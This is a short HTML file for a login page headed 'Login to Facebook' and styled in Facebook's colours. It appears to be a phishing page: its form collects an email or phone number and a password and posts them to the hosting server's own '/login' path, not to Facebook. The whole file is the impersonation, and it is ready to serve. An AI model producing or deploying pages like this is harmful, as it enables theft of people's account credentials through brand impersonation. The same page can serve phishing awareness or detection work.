<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px #aaa;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
    }
    button {
      background: #1877f2;
      color: white;
      padding: 10px;
      border: none;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Login to Facebook</h2>
    <form action="/login" method="post">
      <input type="text" name="username" placeholder="Email or Phone" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
